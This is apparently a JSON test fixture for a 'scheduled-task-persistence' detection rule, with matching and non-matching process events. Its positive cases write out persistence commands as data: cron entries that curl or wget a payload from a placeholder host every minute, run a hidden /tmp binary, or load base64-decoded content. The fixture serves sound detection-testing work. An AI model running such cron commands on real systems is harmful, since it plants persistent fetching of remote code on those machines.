{
 "rule": "scheduled-task-persistence",
 "cases": [
  {"name": "cron line that curls", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c '(crontab -l; echo \"* * * * * curl http://x/p\") | crontab -'", "User": "emp100"}]},
  {"name": "cron line that wgets", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'echo \"* * * * * wget http://x/p\" | crontab -'", "User": "emp100"}]},
  {"name": "cron line that runs from /tmp", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'echo \"* * * * * /tmp/.h\" | crontab -'", "User": "emp100"}]},
  {"name": "cron line with base64", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'echo aGk= | base64 -d | crontab -'", "User": "emp100"}]},
  {"name": "a task created with schtasks", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn x /tr y", "User": "emp100"}]},
  {"name": "crontab -l only", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "/usr/bin/crontab", "CommandLine": "crontab -l", "User": "emp100"}]},
  {"name": "curl with no cron", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "/usr/bin/curl", "CommandLine": "curl http://x/p", "User": "emp100"}]},
  {"name": "schtasks query", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /query", "User": "emp100"}]},
  {"name": "another program with /create", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /create x", "User": "emp100"}]},
  {"name": "the backup account", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c '(crontab -l; echo \"0 2 * * * /opt/backup/run.sh /tmp/stage\") | crontab -'", "User": "svc-backup"}]}
 ]
}
